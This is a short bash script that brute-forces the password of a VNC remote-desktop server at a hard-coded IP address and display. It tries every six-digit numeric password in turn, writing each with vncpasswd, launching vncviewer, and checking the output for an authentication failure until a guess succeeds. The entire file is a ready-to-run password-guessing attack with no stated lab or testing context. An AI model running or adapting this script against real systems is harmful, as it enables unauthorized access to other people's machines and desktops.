#!/bin/bash

pass=0
while true; do
  PASS=$(printf "%06d" $pass)
  echo "Trying $PASS"
  vncpasswd <<EOF
$PASS
$PASS
n
EOF
  vncviewer -passwd ~/.vnc/passwd 128.10.250.51:2 >test 2>&1 &
  sleep 0.5

  if grep -q "Authentication failure" test; then
    echo "FAIL"
    VNC_PID=$(pgrep vncviewer)
    kill "$VNC_PID"
  else
    echo "SUCCESS"
    break
  fi

  ((pass++))
  if [ $pass -gt 999999 ]; then
    echo "COULD NOT GUESS"
    break
  fi
done
